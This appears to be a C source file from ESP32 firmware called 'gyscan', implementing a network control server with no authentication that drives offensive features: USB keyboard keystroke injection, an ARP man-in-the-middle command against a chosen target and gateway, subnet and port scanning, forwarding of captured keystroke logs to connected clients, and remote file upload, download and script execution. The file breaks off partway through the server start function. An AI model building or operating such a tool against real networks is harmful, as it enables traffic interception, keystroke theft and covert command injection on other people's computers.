/*
 * tcp_server.c - gyscan 控制服务器（默认端口 1234）
 *
 * ESP 联网后默认开启 1234 端口与 gyscan 主程序(freeclient)配合。
 * 采用文本行协议（每行以 \n 结尾），支持：
  *   hello / status / storage / ls / read / write / rm / delete / run
 *   keymap on|off / scan <ip|网段> [-p 范围] / close
 *   type <文本> / key <名称>  （USB 键盘注入）
 *   arp <目标IP> <网关IP> | arp stop | arp status  （ARP 中间人）
 *   push <name> <len> / pull <name> / devices / server-kill / server-start  （ADB 类命令）
 *   reboot / poweroff / version   （设备管理）
 *   KEYDATA <文本>            （gyscan 代理上报键盘记录 → 转发）
 *
 * 存储介质自动策略：TF 卡已挂载时 ls/read/write/rm/run 作用于 TF 卡(/sdcard)；
 * 无 TF 卡时全部在内存(RAM)中完成(不写 Flash)。rm 可删除文件或文件夹(递归)。
 *
 * 协议细节见 README.md "gyscan 控制协议(1234)" 章节。
 */

#include "tcp_server.h"
#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <errno.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "lwip/sockets.h"
#include "lwip/inet.h"
#include "esp_log.h"
#include "esp_system.h"
#include "esp_netif.h"
#include "esp_partition.h"
#include "esp_heap_caps.h"
#include "sdkconfig.h"
#include "hid_keyboard.h"
#include "wifi_scan.h"
#include "script_store.h"
#include "net_scan.h"
#include "arp_mitm.h"
#include "sdcard.h"
#include "esp_sleep.h"

static const char *TAG = "tcp_srv";

/* ---- 网络信息辅助 ---- */

typedef struct {
    esp_netif_t *nif;    /* 活跃接口句柄 */
    const char *kind;    /* "eth"(以太网/QEMU) 或 "wifi" */
} active_if_t;

/* 当前已获得 IP 的活跃接口：优先以太网(QEMU openeth)，其次 WiFi STA */
static bool get_active_if(active_if_t *out)
{
    static const char *const keys[] = { "ETH_DEF", "WIFI_STA_DEF" };
    static const char *const kinds[] = { "eth", "wifi" };
    esp_netif_ip_info_t ip;
    for (int i = 0; i < (int)(sizeof(keys) / sizeof(keys[0])); i++) {
        esp_netif_t *nif = esp_netif_get_handle_from_ifkey(keys[i]);
        if (nif != NULL && esp_netif_get_ip_info(nif, &ip) == ESP_OK && ip.ip.addr != 0) {
            out->nif = nif;
            out->kind = kinds[i];
            return true;
        }
    }
    out->nif = NULL;
    out->kind = "-";
    return false;
}

#define TCP_SERVER_MAX_CLIENTS 4
#define TCP_SERVER_LINE_MAX    512
#define SCRIPT_READ_MAX        (60 * 1024)

typedef struct {
    int fd;
    TaskHandle_t task;
    bool keyhub;   /* 该连接是否处于 keyhub 无线键盘流模式 */
} client_t;

static int s_listen_fd = -1;
static client_t s_clients[TCP_SERVER_MAX_CLIENTS];
static SemaphoreHandle_t s_clients_lock = NULL;
static TaskHandle_t s_server_task = NULL;
static volatile bool s_running = false;

/* 键盘记录转发开关（keymap on 时开启） */
static bool s_keymap_active = false;

/* read/write/push/pull 共用的文件缓冲区(60KB)，节省 DRAM */
static char s_file_buf[SCRIPT_READ_MAX];

/* ---------- 发送工具 ---------- */

static void send_line(int fd, const char *fmt, ...)
{
    char buf[1200];
    va_list args;
    va_start(args, fmt);
    int len = vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    if (len > 0) {
        send(fd, buf, len, 0);
    }
}

/* run 脚本的 print 输出回调：直接把字节流发回客户端 fd */
static void script_run_fd_out(const char *data, size_t len, void *ctx)
{
    int fd = (ctx != NULL) ? *(const int *)ctx : -1;
    if (fd >= 0 && len > 0) {
        send(fd, data, (int)len, 0);
    }
}

static void broadcast(const char *fmt, ...)
{
    char buf[1200];
    va_list args;
    va_start(args, fmt);
    int len = vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    if (len <= 0) {
        return;
    }
    if (xSemaphoreTake(s_clients_lock, pdMS_TO_TICKS(100)) != pdTRUE) {
        return;
    }
    for (int i = 0; i < TCP_SERVER_MAX_CLIENTS; i++) {
        if (s_clients[i].fd >= 0) {
            send(s_clients[i].fd, buf, len, 0);
        }
    }
    xSemaphoreGive(s_clients_lock);
}

/* 从 fd 精确读取 len 字节（用于 upload） */
static int recv_exact(int fd, char *buf, int len, int timeout_ms)
{
    int got = 0;
    struct timeval tv = { timeout_ms / 1000, (timeout_ms % 1000) * 1000 };
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    while (got < len) {
        int r = recv(fd, buf + got, len - got, 0);
        if (r <= 0) {
            break;
        }
        got += r;
    }
    return got;
}

/* ---------- 命令处理 ---------- */

/* ls 列表回调：发送文件名 */
typedef struct {
    int fd;
    int count;
} list_ctx_t;

/* ls(含目录) 回调：目录名以 '/' 结尾，供客户端区分 */
static void ls_all_cb(const char *name, bool is_dir, void *ctx)
{
    list_ctx_t *lc = (list_ctx_t *)ctx;
    send_line(lc->fd, "%s%s\n", name, is_dir ? "/" : "");
    lc->count++;
}

/* storage 列表计数回调（只统计条目数） */
static void count_cb(const char *name, bool is_dir, void *ctx)
{
    (void)name;
    (void)is_dir;
    (*(int *)ctx)++;
}

/* scan 命中回调：实时推送 SVC 行 */
typedef struct {
    int fd;
} svc_ctx_t;

static void svc_hit_cb(const char *host, uint16_t port, void *ctx)
{
    svc_ctx_t *sc = (svc_ctx_t *)ctx;
    send_line(sc->fd, "SVC %s %u\n", host, (unsigned)port);
}

static void handle_command(int fd, const char *line)
{
    char cmd[32] = {0};
    const char *rest = NULL;

    const char *sp = strchr(line, ' ');
    if (sp != NULL) {
        size_t len = (size_t)(sp - line);
        if (len >= sizeof(cmd)) len = sizeof(cmd) - 1;
        memcpy(cmd, line, len);
        rest = sp + 1;
        while (*rest == ' ') rest++;
    } else {
        strncpy(cmd, line, sizeof(cmd) - 1);
    }

    if (strcmp(cmd, "hello") == 0) {
        /* 发现协议：gyscan 扫描设备用 */
        send_line(fd, "OK hello espgyscan\n");

    } else if (strcmp(cmd, "status") == 0) {
        char ip_str[32] = "0.0.0.0";
        esp_netif_t *nif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
        esp_netif_ip_info_t ip;
        if (nif != NULL && esp_netif_get_ip_info(nif, &ip) == ESP_OK) {
            snprintf(ip_str, sizeof(ip_str), IPSTR, IP2STR(&ip.ip));
        }
        send_line(fd, "OK status ip=%s heap=%dKB hid=%d ssid=%s\n",
                  ip_str, (int)(esp_get_free_heap_size() / 1024),
                  hid_keyboard_is_mounted() ? 1 : 0,
                  wifi_get_active_ssid());

    } else if (strcmp(cmd, "netinfo") == 0) {
        /* 网络信息：gyscan esp ip 查看用。单行 key=value，未连接项为 '-' */
        char iface[8] = "-", ip_str[16] = "-", mask_str[16] = "-";
        char gw_str[16] = "-", mac_str[20] = "-", ssid[40] = "-";
        active_if_t a;
        if (get_active_if(&a)) {
            snprintf(iface, sizeof(iface), "%s", a.kind);
            esp_netif_ip_info_t ip;
            if (esp_netif_get_ip_info(a.nif, &ip) == ESP_OK) {
                snprintf(ip_str, sizeof(ip_str), IPSTR, IP2STR(&ip.ip));
                snprintf(mask_str, sizeof(mask_str), IPSTR, IP2STR(&ip.netmask));
                snprintf(gw_str, sizeof(gw_str), IPSTR, IP2STR(&ip.gw));
            }
            uint8_t mac[6] = {0};
            if (esp_netif_get_mac(a.nif, mac) == ESP_OK) {
                snprintf(mac_str, sizeof(mac_str),
                         "%02x:%02x:%02x:%02x:%02x:%02x",
                         mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
            }
        }
        if (wifi_is_connected()) {
            snprintf(ssid, sizeof(ssid), "%s", wifi_get_active_ssid());
        }
        send_line(fd,
                  "OK netinfo iface=%s ip=%s netmask=%s gw=%s mac=%s ssid=%s heap=%d\n",
                  iface, ip_str, mask_str, gw_str, mac_str, ssid,
                  (int)(esp_get_free_heap_size() / 1024));

    } else if (strcmp(cmd, "ls") == 0) {
        list_ctx_t lc = { .fd = fd, .count = 0 };
        script_store_list_all(ls_all_cb, &lc);
        send_line(fd, "END ls count=%d\n", lc.count);

    } else if (strcmp(cmd, "storage") == 0) {
        /* 当前存储介质查询：media=sd|ram（有 TF 卡并挂载即 sd） */
        int n = 0;
        script_store_list_all(count_cb, &n);
        if (script_store_media() == SCRIPT_MEDIA_SDCARD) {
            send_line(fd, "OK storage media=sd files=%d\n", n);
        } else {
            send_line(fd, "OK storage media=ram files=%d ram_bytes=%d\n", n,
                      (int)script_store_ram_bytes());
        }
    } else if (strcmp(cmd, "free") == 0) {
        /* 内存状态：总/已用/最小剩余/最大连续块（字节） */
        size_t free_heap = esp_get_free_heap_size();
        size_t min_free = esp_get_minimum_free_heap_size();
        size_t largest_block = heap_caps_get_largest_free_block(MALLOC_CAP_INTERNAL);
        size_t total_heap = heap_caps_get_total_size(MALLOC_CAP_INTERNAL);
        send_line(fd, "OK free total=%u free=%u min_free=%u largest_block=%u\n",
                  (unsigned)total_heap,
                  (unsigned)free_heap,
                  (unsigned)min_free,
                  (unsigned)largest_block);

    } else if (strcmp(cmd, "lsblk") == 0) {
        /* Flash 分区表 */
        send_line(fd, "OK lsblk\n");
        send_line(fd, "[flash]\n");
        esp_partition_iterator_t it = esp_partition_find(ESP_PARTITION_TYPE_ANY, ESP_PARTITION_SUBTYPE_ANY, NULL);
        while (it != NULL) {
            const esp_partition_t *p = esp_partition_get(it);
            const char *type_str[] = { "app", "data" };
            const char *subtype_app[] = { "factory", "ota_0", "ota_1", "test" };
            const char *label = p->label[0] ? p->label : "-";
            char sub[16] = {0};
            if (p->type == ESP_PARTITION_TYPE_APP) {
                int st = p->subtype - ESP_PARTITION_SUBTYPE_APP_FACTORY;
                if (st >= 0 && st < 4) snprintf(sub, sizeof(sub), "%s", subtype_app[st]);
                else snprintf(sub, sizeof(sub), "ota_%d", st - 3);
            } else {
                snprintf(sub, sizeof(sub), "0x%02x", p->subtype);
            }
            send_line(fd, "  %s %-8s %-12s 0x%06x %llu  %s\n",
                      type_str[p->type < 2 ? p->type : 0],
                      sub, label, p->address, (unsigned long long)p->size, p->encrypted ? "encrypted" : "");
            it = esp_partition_next(it);
        }
        esp_partition_iterator_release(it);

        /* TF 卡 */
        if (sdcard_is_mounted()) {
            uint64_t cap = sdcard_get_capacity();
            send_line(fd, "[sdcard]\n");
            send_line(fd, "  sdcard  -  -  -  %llu  -\n", (unsigned long long)cap);
        }

        send_line(fd, "END lsblk\n");

    } else if (strcmp(cmd, "read") == 0) {
        if (rest == NULL || *rest == '\0') {
            send_line(fd, "ERR read usage\n");
        } else {
            size_t n = 0;
            esp_err_t r = script_store_read(rest, s_file_buf, sizeof(s_file_buf), &n);
            if (r == ESP_OK) {
                send_line(fd, "OK read %d\n", (int)n);
                send(fd, s_file_buf, n, 0);
            } else {
                send_line(fd, "ERR read %s\n", esp_err_to_name(r));
            }
        }

    } else if (strcmp(cmd, "write") == 0) {
        /* write <name> <len>\n <raw bytes> */
        char name[64] = {0};
        long len = 0;
        if (rest == NULL ||
            sscanf(rest, "%63s %ld", name, &len) != 2 || len < 0 ||
            len > SCRIPT_READ_MAX) {
            send_line(fd, "ERR write usage\n");
        } else {
            int got = recv_exact(fd, s_file_buf, (int)len, 30000);
            esp_err_t r = (got == (int)len)
                              ? script_store_write(name, s_file_buf, (size_t)len)
                              : ESP_ERR_INVALID_SIZE;
            if (r == ESP_OK) {
                send_line(fd, "OK write %s\n", name);
            } else {
                send_line(fd, "ERR write %s\n", esp_err_to_name(r));
            }
        }

    } else if (strcmp(cmd, "delete") == 0 || strcmp(cmd, "rm") == 0) {
        /* rm/delete <文件|文件夹>：删除文件；TF 卡上为目录时递归删除 */
        if (rest == NULL || *rest == '\0') {
            send_line(fd, "ERR %s usage: %s <文件|文件夹>\n", cmd, cmd);
        } else {
            esp_err_t r = script_store_rm(rest);
            if (r == ESP_OK) {
                send_line(fd, "OK %s %s\n", cmd, rest);
            } else if (r == ESP_ERR_NOT_FOUND) {
                send_line(fd, "ERR %s not found: %s (介质: %s)\n",
                          cmd, rest, script_store_media_name());
            } else {
                send_line(fd, "ERR %s %s\n", cmd, esp_err_to_name(r));
            }
        }

    } else if (strcmp(cmd, "run") == 0) {
        if (rest == NULL || *rest == '\0') {
            send_line(fd, "ERR run usage\n");
        } else {
            /* 脚本 print 输出实时转发回本客户端 fd（原始字节流）；
             * out_ctx 指向本任务栈上的 fd，执行期间同步、锁保护，安全。 */
            static char s_rmsg[256];
            esp_err_t r = script_execute(rest, script_run_fd_out, &fd,
                                         s_rmsg, sizeof(s_rmsg));
            if (r == ESP_OK) {
                send_line(fd, "END run\n");
            } else {
                send_line(fd, "ERR run %s\n", s_rmsg);
            }
        }


    } else if (strcmp(cmd, "keymap") == 0) {
        if (rest != NULL && strcmp(rest, "on") == 0) {
            s_keymap_active = true;
            ESP_LOGI(TAG, "键盘记录转发已开启");
            broadcast("KEYMAP on\n");
            send_line(fd, "OK keymap on\n");
        } else if (rest != NULL && strcmp(rest, "off") == 0) {
            s_keymap_active = false;
            ESP_LOGI(TAG, "键盘记录转发已关闭");
            broadcast("KEYMAP off\n");
            send_line(fd, "OK keymap off\n");
        } else {
            send_line(fd, "ERR keymap usage: keymap on|off\n");
        }

    } else if (strcmp(cmd, "KEYDATA") == 0) {
        /* gyscan 代理/本机采集的键盘记录，转发给所有客户端实时显示 */
        if (rest != NULL && *rest != '\0') {
            broadcast("KEYLOG %s\n", rest);
        }

    } else if (strcmp(cmd, "scan") == 0) {
        if (rest == NULL || *rest == '\0') {
            send_line(fd, "ERR scan usage: scan <ip|网段> [-p 范围]\n");
        } else {
            svc_ctx_t sc = { .fd = fd };
            send_line(fd, "OK scan start %s\n", rest);

            char target[64] = {0};
            long lo = 0, hi = 0;
            int has_range = 0;
            if (sscanf(rest, "%63s -p %ld-%ld", target, &lo, &hi) == 3) {
                has_range = 1;
            } else {
                sscanf(rest, "%63s", target);
            }

            esp_err_t r;
            if (has_range) {
                r = net_scan_host_range(target, (uint16_t)lo, (uint16_t)hi, 250,
                                        svc_hit_cb, &sc);
            } else if (strchr(target, '/') != NULL) {
                r = net_scan_cidr(target, 150, svc_hit_cb, &sc);
            } else {
                r = net_scan_host_common(target, 250, svc_hit_cb, &sc);
            }

            if (r == ESP_OK) {
                send_line(fd, "END scan ok\n");
            } else {
                send_line(fd, "ERR scan %s\n", esp_err_to_name(r));
            }
        }

    } else if (strcmp(cmd, "arp") == 0) {
        /* arp <目标IP> <网关IP> | arp stop | arp status */
        if (rest == NULL || *rest == '\0') {
            send_line(fd, "ERR arp usage: arp <目标IP> <网关IP> | arp stop | arp status\n");
        } else if (strcmp(rest, "stop") == 0) {
            arp_mitm_stop();
            send_line(fd, "OK arp stop\n");
        } else if (strcmp(rest, "status") == 0) {
            char st[64];
            arp_mitm_status_text(st, sizeof(st));
            send_line(fd, "OK arp status running=%d %s\n",
                      arp_mitm_is_running() ? 1 : 0, st);
        } else {
            char target[16] = {0}, gateway[16] = {0};
            if (sscanf(rest, "%15s %15s", target, gateway) != 2) {
                send_line(fd, "ERR arp usage: arp <目标IP> <网关IP>\n");
            } else {
                esp_err_t r = arp_mitm_start(target, gateway);
                if (r == ESP_OK) {
                    send_line(fd, "OK arp start %s %s\n", target, gateway);
                } else {
                    send_line(fd, "ERR arp %s\n", esp_err_to_name(r));
                }
            }
        }

    } else if (strcmp(cmd, "type") == 0) {
        if (rest == NULL || *rest == '\0') {
            send_line(fd, "ERR type usage\n");
        } else {
            esp_err_t r = hid_keyboard_type_text(rest);
            if (r == ESP_OK) {
                send_line(fd, "OK type %d\n", (int)strlen(rest));
            } else {
                send_line(fd, "ERR type %s\n", esp_err_to_name(r));
            }
        }

    } else if (strcmp(cmd, "key") == 0) {
        if (rest == NULL || *rest == '\0') {
            send_line(fd, "ERR key usage\n");
        } else {
            esp_err_t r = hid_keyboard_press_name(rest);
            if (r == ESP_OK) {
                send_line(fd, "OK key %s\n", rest);
            } else {
                send_line(fd, "ERR key %s\n", esp_err_to_name(r));
            }
        }

    } else if (strcmp(cmd, "keyhub") == 0) {
        /* keyhub on|off —— 无线键盘流模式 */
        if (rest != NULL && strcmp(rest, "on") == 0) {
            /* 置位 keyhub 标志并清空 pending 行缓冲 */
            xSemaphoreTake(s_clients_lock, portMAX_DELAY);
            for (int i = 0; i < TCP_SERVER_MAX_CLIENTS; i++) {
                if (s_clients[i].fd == fd) {
                    s_clients[i].keyhub = true;
                    break;
                }
            }
            xSemaphoreGive(s_clients_lock);
            send_line(fd, "OK keyhub on\n");
            if (!hid_keyboard_is_mounted()) {
                send_line(fd, "WARN hid not mounted\n");
            }
        } else if (rest != NULL && strcmp(rest, "off") == 0) {
            xSemaphoreTake(s_clients_lock, portMAX_DELAY);
            for (int i = 0; i < TCP_SERVER_MAX_CLIENTS; i++) {
                if (s_clients[i].fd == fd) {
                    s_clients[i].keyhub = false;
                    break;
                }
            }
            xSemaphoreGive(s_clients_lock);
            send_line(fd, "OK keyhub off\n");
        } else {
            send_line(fd, "ERR keyhub usage: keyhub on|off\n");
        }
    } else if (strcmp(cmd, "close") == 0) {
        send_line(fd, "OK close\n");
        shutdown(fd, SHUT_RDWR);

    } else if (strcmp(cmd, "push") == 0) {
        /* push <name> <len>\n<raw bytes> —— 上传文件到 ESP(等同 write) */
        char name[64] = {0};
        long len = 0;
        if (rest == NULL ||
            sscanf(rest, "%63s %ld", name, &len) != 2 || len < 0 ||
            len > SCRIPT_READ_MAX) {
            send_line(fd, "ERR push usage: push <name> <len>\n");
        } else {
            int got = recv_exact(fd, s_file_buf, (int)len, 30000);
            esp_err_t r = (got == (int)len)
                              ? script_store_write(name, s_file_buf, (size_t)len)
                              : ESP_ERR_INVALID_SIZE;
            if (r == ESP_OK) {
                send_line(fd, "OK push %s %d\n", name, (int)len);
            } else {
                send_line(fd, "ERR push %s\n", esp_err_to_name(r));
            }
        }

    } else if (strcmp(cmd, "pull") == 0) {
        /* pull <name> —— 下载 ESP 文件到本地(等同 read) */
        if (rest == NULL || *rest == '\0') {
            send_line(fd, "ERR pull usage: pull <name>\n");
        } else {
            size_t n = 0;
            esp_err_t r = script_store_read(rest, s_file_buf, sizeof(s_file_buf), &n);
            if (r == ESP_OK) {
                send_line(fd, "OK pull %d\n", (int)n);
                send(fd, s_file_buf, n, 0);
            } else {
                send_line(fd, "ERR pull %s\n", esp_err_to_name(r));
            }
        }

    } else if (strcmp(cmd, "devices") == 0) {
        /* 列出当前已连接的 TCP 客户端 */
        int count = tcp_server_client_count();
        send_line(fd, "OK devices count=%d\n", count);
        xSemaphoreTake(s_clients_lock, pdMS_TO_TICKS(100));
        for (int i = 0; i < TCP_SERVER_MAX_CLIENTS; i++) {
            if (s_clients[i].fd >= 0) {
                struct sockaddr_in addr;
                socklen_t alen = sizeof(addr);
                char ip[16] = "-";
                if (getpeername(s_clients[i].fd, (struct sockaddr *)&addr, &alen) == 0) {
                    inet_ntop(AF_INET, &addr.sin_addr, ip, sizeof(ip));
                }
                send_line(fd, "device %s fd=%d\n", ip, s_clients[i].fd);
            }
        }
        xSemaphoreGive(s_clients_lock);
        send_line(fd, "END devices\n");

    } else if (strcmp(cmd, "server-kill") == 0) {
        /* 停止 TCP 服务器(挂起当前连接前下） */
        send_line(fd, "OK server-kill\n");
        shutdown(fd, SHUT_RDWR);
        tcp_server_stop();

    } else if (strcmp(cmd, "server-start") == 0) {
        /* 启动 TCP 服务器(如未运行) */
        if (tcp_server_is_running()) {
            send_line(fd, "OK server-start already running\n");
        } else {
            esp_err_t r = tcp_server_start();
            if (r == ESP_OK) {
                send_line(fd, "OK server-start\n");
            } else {
                send_line(fd, "ERR server-start %s\n", esp_err_to_name(r));
            }
        }

    } else if (strcmp(cmd, "reboot") == 0) {
        /* 重启 ESP32 */
        send_line(fd, "OK reboot\n");
        shutdown(fd, SHUT_RDWR);
        /* 延迟让响应包发送完成 */
        vTaskDelay(pdMS_TO_TICKS(100));
        esp_restart();

    } else if (strcmp(cmd, "poweroff") == 0) {
        /* 进入深度睡眠(关机) */
        send_line(fd, "OK poweroff\n");
        shutdown(fd, SHUT_RDWR);
        vTaskDelay(pdMS_TO_TICKS(100));
        ESP_LOGI(TAG, "poweroff: 进入深度睡眠");
        esp_sleep_enable_ext0_wakeup(GPIO_NUM_0, 0);
        esp_deep_sleep_start();

    } else if (strcmp(cmd, "version") == 0) {
        /* 固件版本信息 */
        send_line(fd, "OK version " PROJECT_VER " idf=" IDF_VER "\n");

    } else {
        send_line(fd, "ERR unknown %s\n", cmd);
    }
}

/* 查询某 fd 是否处于 keyhub 模式 */
static bool client_is_keyhub(int fd)
{
    bool on = false;
    xSemaphoreTake(s_clients_lock, portMAX_DELAY);
    for (int i = 0; i < TCP_SERVER_MAX_CLIENTS; i++) {
        if (s_clients[i].fd == fd) {
            on = s_clients[i].keyhub;
            break;
        }
    }
    xSemaphoreGive(s_clients_lock);
    return on;
}

/* 关闭某 fd 的 keyhub 模式（无需回包） */
static void client_keyhub_off(int fd)
{
    xSemaphoreTake(s_clients_lock, portMAX_DELAY);
    for (int i = 0; i < TCP_SERVER_MAX_CLIENTS; i++) {
        if (s_clients[i].fd == fd) {
            s_clients[i].keyhub = false;
            break;
        }
    }
    xSemaphoreGive(s_clients_lock);
}

/* 解析 hex（1~2 位），失败返回 -1 */
static int parse_hex(const char *s)
{
    if (s == NULL || *s == '\0') {
        return -1;
    }
    int v = 0, n = 0;
    for (; *s != '\0' && n < 2; s++, n++) {
        char c = *s;
        int d;
        if (c >= '0' && c <= '9') {
            d = c - '0';
        } else if (c >= 'a' && c <= 'f') {
            d = c - 'a' + 10;
        } else if (c >= 'A' && c <= 'F') {
            d = c - 'A' + 10;
        } else {
            return -1;
        }
        v = (v << 4) | d;
    }
    return v;
}

/*
 * keyhub 流模式下的按键帧解析。
 *   HID <modifier_hex> <k1_hex> [k2..k6]  任意组合键报告
 *   TXT <文本>                             逐字符输入文本
 *   keyhub off                             结束流模式
 * 返回 true 表示本帧已处理（保持 keyhub 模式）。
 */
static bool handle_keyhub_line(int fd, const char *line)
{
    if (strncmp(line, "keyhub", 6) == 0) {
        if (strncmp(line, "keyhub off", 10) == 0) {
            client_keyhub_off(fd);
        }
        send_line(fd, "OK keyhub off\n");
        return false;
    }
    if (strncmp(line, "TXT ", 4) == 0) {
        hid_keyboard_type_text(line + 4);
        return true;
    }
    if (strncmp(line, "HID ", 4) == 0) {
        char buf[64];
        strncpy(buf, line + 4, sizeof(buf) - 1);
        buf[sizeof(buf) - 1] = '\0';
        int mod = parse_hex(buf);
        uint8_t kc[6] = { 0, 0, 0, 0, 0, 0 };
        int n = 0;
        char *p = buf;
        while ((p = strchr(p, ' ')) != NULL) {
            p++;
            int v = parse_hex(p);
            if (v < 0 || n >= 6) {
                break;
            }
            kc[n++] = (uint8_t)v;
        }
        (void)hid_keyboard_press_report((uint8_t)(mod < 0 ? 0 : mod), kc);
        return true;
    }
    send_line(fd, "ERR keyhub bad frame\n");
    return true;
}

/* ---------- 客户端处理任务 ---------- */

/*
 * arg = 槽位索引（s_clients[] 下标）。fd 值会被内核复用、task 句柄存在
 * 「先注册后填入」的时序窗口，唯独槽位索引在本连接的整个生命周期内
 * 唯一且不变——用它定位自己的连接，可彻底避免上述竞态导致槽位泄漏。
 */
static void client_task(void *arg)
{
    int idx = (int)(intptr_t)arg;
    int fd;

    xSemaphoreTake(s_clients_lock, portMAX_DELAY);
    fd = (idx >= 0 && idx < TCP_SERVER_MAX_CLIENTS) ? s_clients[idx].fd : -1;
    xSemaphoreGive(s_clients_lock);
    if (fd < 0) {
        ESP_LOGE(TAG, "客户端槽位无效(idx=%d)，任务退出", idx);
        vTaskDelete(NULL);
    }

    char line[TCP_SERVER_LINE_MAX];
    int len = 0;

    ESP_LOGI(TAG, "客户端任务启动 (fd=%d)", fd);

    while (1) {
        char c;
        int r = recv(fd, &c, 1, 0);
        if (r <= 0) {
            break;   /* 断开或出错 */
        }
        if (client_is_keyhub(fd)) {
            if (c == '\x03') {          /* 远端 Ctrl+C 结束键盘模拟 */
                client_keyhub_off(fd);
                send_line(fd, "OK keyhub off\n");
                len = 0;
                continue;
            }
            if (c == '\n') {
                line[len] = '\0';
                if (len > 0 && !handle_keyhub_line(fd, line)) {
                    len = 0;
                    continue;           /* 已退出 keyhub 模式 */
                }
                len = 0;
            } else if (len < (int)sizeof(line) - 1) {
                line[len++] = c;
            } else {
                len = 0;
            }
            continue;
        }
        if (c == '\n') {
            if (len > 0 && line[len - 1] == '\r') {
                len--;
            }
            line[len] = '\0';
            if (len > 0) {
                handle_command(fd, line);
            }
            len = 0;
        } else if (len < (int)sizeof(line) - 1) {
            line[len++] = c;
        } else {
            len = 0;   /* 行过长，丢弃 */
        }
    }

    close(fd);
    /* 按槽位索引清空自己的连接，无 fd/task 匹配歧义 */
    xSemaphoreTake(s_clients_lock, portMAX_DELAY);
    if (idx >= 0 && idx < TCP_SERVER_MAX_CLIENTS &&
        s_clients[idx].fd == fd) {
        s_clients[idx].fd = -1;
        s_clients[idx].task = NULL;
    }
    xSemaphoreGive(s_clients_lock);
    ESP_LOGI(TAG, "客户端断开 (fd=%d)", fd);
    vTaskDelete(NULL);
}

/* 分配一个空闲槽位并把 fd 记入；返回槽位索引，-1 表示已满 */
static int register_client(int fd)
{
    int idx = -1;
    xSemaphoreTake(s_clients_lock, portMAX_DELAY);
    for (int i = 0; i < TCP_SERVER_MAX_CLIENTS; i++) {
        if (s_clients[i].fd < 0) {
            s_clients[i].fd = fd;
            s_clients[i].task = NULL;
            idx = i;
            break;
        }
    }
    xSemaphoreGive(s_clients_lock);
    return idx;
}


/* 任一可用网络接口（WiFi STA 或 QEMU 以太网 ETH_DEF）已获得 IP 即视为就绪 */
static bool net_any_if_ready(void)
{
    active_if_t a;
    return get_active_if(&a);
}

/* ---------- 服务器主任务 ---------- */

static void server_task(void *arg)
{
    (void)arg;
    int opt = 1;

    while (s_running) {
        if (!net_any_if_ready()) {
            ESP_LOGI(TAG, "等待网络连接(WiFi/以太网)，就绪后开启 %d 端口...", CONFIG_GYSCAN_TCP_PORT);
            vTaskDelay(pdMS_TO_TICKS(3000));
            continue;
        }

        int listen_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (listen_fd < 0) {
            ESP_LOGE(TAG, "创建监听 socket 失败 errno=%d", errno);
            vTaskDelay(pdMS_TO_TICKS(3000));
            continue;
        }
        setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(CONFIG_GYSCAN_TCP_PORT);
        addr.sin_addr.s_addr = htonl(INADDR_ANY);

        if (bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
            ESP_LOGE(TAG, "bind 失败 errno=%d", errno);
            close(listen_fd);
            vTaskDelay(pdMS_TO_TICKS(3000));
            continue;
        }
        if (listen(listen_fd, TCP_SERVER_MAX_CLIENTS) != 0) {
            ESP_LOGE(TAG, "listen 失败 errno=%d", errno);
            close(listen_fd);
            vTaskDelay(pdMS_TO_TICKS(3000));
            continue;
        }

        s_listen_fd = listen_fd;
        ESP_LOGI(TAG, "gyscan 控制服务器已开启: 端口 %d", CONFIG_GYSCAN_TCP_PORT);

        while (s_running) {
            fd_set rfds;
            FD_ZERO(&rfds);
            FD_SET(listen_fd, &rfds);
            struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };
            int ret = select(listen_fd + 1, &rfds, NULL, NULL, &tv);
            if (ret <= 0) {
                if (!net_any_if_ready()) {
                    ESP_LOGW(TAG, "网络已断开，重新等待连接...");
                    break;
                }
                continue;
            }

            struct sockaddr_in client_addr;
            socklen_t addr_len = sizeof(client_addr);
            int fd = accept(listen_fd, (struct sockaddr *)&client_addr, &addr_len);
            if (fd < 0) {
                continue;
            }

            char ip[16] = {0};
            inet_ntop(AF_INET, &client_addr.sin_addr, ip, sizeof(ip));
            ESP_LOGI(TAG, "gyscan 客户端连接: %s (fd=%d)", ip, fd);

            int cidx = register_client(fd);
            if (cidx < 0) {
                ESP_LOGW(TAG, "客户端数已达上限，拒绝连接");
                close(fd);
                continue;
            }

            TaskHandle_t t = NULL;
            BaseType_t cr = xTaskCreate(client_task, "tcp_cli", 8192,
                                        (void *)(intptr_t)cidx, 6, &t);
            if (cr != pdPASS) {
                /* 任务创建失败：必须回滚槽位并关闭连接，否则该槽位
                 * 会被永久占用且无人消费（僵尸连接泄漏）。 */
                ESP_LOGE(TAG, "客户端任务创建失败(%d)，关闭连接 fd=%d", cr, fd);
                close(fd);
                xSemaphoreTake(s_clients_lock, portMAX_DELAY);
                if (s_clients[cidx].fd == fd) {
                    s_clients[cidx].fd = -1;
                    s_clients[cidx].task = NULL;
                }
                xSemaphoreGive(s_clients_lock);
                continue;
            }

            xSemaphoreTake(s_clients_lock, portMAX_DELAY);
            if (s_clients[cidx].fd == fd) {
                s_clients[cidx].task = t;
            }
            xSemaphoreGive(s_clients_lock);
        }

        close(listen_fd);
        s_listen_fd = -1;
        vTaskDelay(pdMS_TO_TICKS(3000));
    }

    ESP_LOGI(TAG, "gyscan 控制服务器已停止");
    s_server_task = NULL;
    vTaskDelete(NULL);
}

/* ---------- 对外接口 ---------- */

esp_err_t tcp_server_start(void)
{
    if (s_server_task != NULL) {
        return ESP_OK;   /* 已在运行 */
    }
    if (s_clients_lock == NULL) {
        s_clients_lock = xSemaphoreCreateMutex();
    }
    /* 槽位 fd 初值必须为 -1（static 数组初值 0 会被误判为已占用连接） */
    for (int i = 0; i < TCP_SERVER_MAX_CLIENTS; i++) {
        s_clients[i].fd = -1;
        s_clients[i].task = NULL;
    }
    s_running = true;
